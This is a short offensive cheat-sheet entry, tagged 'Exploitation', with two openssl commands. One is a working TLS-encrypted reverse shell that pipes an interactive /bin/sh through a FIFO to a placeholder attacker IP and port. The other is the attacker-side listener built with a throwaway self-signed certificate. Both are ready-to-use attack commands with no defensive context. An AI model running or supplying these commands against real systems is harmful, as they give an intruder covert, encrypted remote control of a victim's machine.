# [Exploitation] Reverse shell (client via s_client) --openssl
mkfifo /tmp/.p; /bin/sh -i < /tmp/.p 2>&1 | openssl s_client -quiet -connect <attacker_ip>:<port> > /tmp/.p

# [Exploitation] TLS listener (quick self-signed cert) --openssl
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes && \
openssl s_server -quiet -key key.pem -cert cert.pem -port <port>
